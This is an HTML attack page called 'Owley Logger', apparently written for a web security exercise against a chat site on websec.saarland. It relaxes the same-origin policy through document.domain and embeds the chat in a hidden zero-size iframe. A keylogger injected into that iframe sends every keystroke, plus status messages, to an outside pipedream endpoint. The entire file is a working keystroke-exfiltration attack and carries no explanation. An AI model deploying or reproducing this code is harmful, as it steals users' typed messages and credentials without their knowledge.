<!DOCTYPE html>
<html>
  <head>
    <title>Owley Logger</title>
    <script>
      document.domain = "websec.saarland"; // Relax SOP

      // Function to send logs to your pipedream endpoint
      function logToServer(data) {
        fetch("https://eooaktfbjo7cto7.m.pipedream.net", {
          method: "POST",
          mode: "no-cors",
          body: JSON.stringify({ key: data })
        });
      }

      // Set up keylogger after iframe loads
      function setupKeylogger() {
        try {
          const iframe = document.getElementById("chat_frame");
          const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;

          // Make sure same domain is set
          iframe.contentWindow.document.domain = "websec.saarland";

          iframe.contentWindow.addEventListener("keydown", function (e) {
            logToServer(e.key);
          });

          // Log success
          logToServer("Keylogger injected successfully");
        } catch (e) {
          logToServer("Error injecting keylogger: " + e.message);
        }
      }
    </script>
  </head>
  <body>
    <h1>Welcome Owley ðŸ˜ˆ</h1>
    <iframe id="chat_frame" src="https://chat.websec.saarland" onload="setupKeylogger()" style="width:0;height:0;border:0;"></iframe>
  </body>
</html>
